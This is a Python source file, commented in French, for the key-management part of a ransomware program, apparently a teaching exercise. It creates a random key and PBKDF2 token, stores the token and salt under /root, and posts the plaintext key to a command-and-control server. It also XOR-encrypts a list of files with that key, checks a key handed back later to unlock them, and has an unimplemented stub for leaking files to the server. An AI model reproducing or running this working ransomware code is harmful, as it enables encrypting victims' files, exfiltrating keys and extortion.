from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000  # Nombre d'itérations pour PBKDF2
    TOKEN_LENGTH = 16  # Taille du token
    SALT_LENGTH = 16   # Taille du sel
    KEY_LENGTH = 16    # Taille de la clé

    def __init__(self, remote_host_port: str = "127.0.0.1:6666", path: str = "/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt: bytes, key: bytes) -> bytes:
        """Génère un token en dérivant la clé avec le sel."""
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION,
        )
        return kdf.derive(key)

    def create(self) -> Tuple[bytes, bytes, bytes]:
        """Génère un sel et une clé aléatoire puis dérive un token."""
        salt = secrets.token_bytes(self.SALT_LENGTH)
        key = secrets.token_bytes(self.KEY_LENGTH)
        token = self.do_derivation(salt, key)
        return salt, key, token

    def bin_to_b64(self, data: bytes) -> str:
        """Encode des données binaires en base64 sous forme de chaîne UTF-8."""
        return base64.b64encode(data).decode("utf-8")

    def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
        """Envoie les données cryptographiques au serveur CNC."""
        url = f'http://{self._remote_host_port}/new'
        response = requests.post(url, json={
            "token": self.bin_to_b64(token),
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key)
        })
        if response.status_code != 200:
            self._log.error("Erreur lors de l'envoi au serveur CNC")

    def setup(self) -> None:
        """Crée les secrets, les stocke localement et les envoie au CNC."""
        salt, key, token = self.create()
        dir_path = os.path.join(self._path, 'token')  # Correction du chemin
        os.makedirs(dir_path, exist_ok=True)  # Création du dossier si besoin

        token_file = os.path.join(dir_path, 'token.bin')
        salt_file = os.path.join(dir_path, 'salt.bin')

        if os.path.exists(token_file):
            print("token.bin file already exists")
            return

        with open(token_file, 'wb') as f:
            f.write(token)
        with open(salt_file, 'wb') as f:
            f.write(salt)

        self.post_new(salt, key, token)

    def load(self) -> None:
        """Charge le sel et le token depuis les fichiers locaux."""
        dir_path = os.path.join(self._path, 'token')
        salt_file = os.path.join(dir_path, 'salt.bin')
        token_file = os.path.join(dir_path, 'token.bin')

        if os.path.exists(salt_file):
            with open(salt_file, "rb") as f:
                self._salt = f.read()
        if os.path.exists(token_file):
            with open(token_file, "rb") as f:
                self._token = f.read()

    def check_key(self, candidate_key: bytes) -> bool:
        """Vérifie si une clé donnée est correcte."""
        candidate_token = self.do_derivation(self._salt, candidate_key)
        return candidate_token == self._token

    def set_key(self, b64_key: str) -> None:
        """Décode et valide une clé fournie en base64."""
        decoded_key = base64.b64decode(b64_key)
        if not self.check_key(decoded_key):
            raise ValueError("Clé incorrecte")
        self._key = decoded_key

    def get_hex_token(self) -> str:
        """Retourne le token sous forme d'un hash SHA-256 hexadécimal."""
        return sha256(self._token).hexdigest()

    def xorfiles(self, files: List[str]) -> None:
        """Applique XOR sur chaque fichier avec la clé."""
        for f in files:
            xorfile(f, self._key)

    def leak_files(self, files: List[str]) -> None:
        """Envoie les fichiers au CNC (non implémenté)."""
        raise NotImplementedError()

    def clean(self) -> None:
        """Efface les fichiers de token et de sel et supprime la clé de la mémoire."""
        dir_path = os.path.join(self._path, 'token')
        salt_file = os.path.join(dir_path, "salt.bin")
        token_file = os.path.join(dir_path, "token.bin")

        if os.path.exists(salt_file):
            os.remove(salt_file)
        if os.path.exists(token_file):
            os.remove(token_file)
        if os.path.exists(dir_path):
            os.rmdir(dir_path)  # Supprime le dossier si vide

        self._salt = None
        self._token = None
        self._key = None
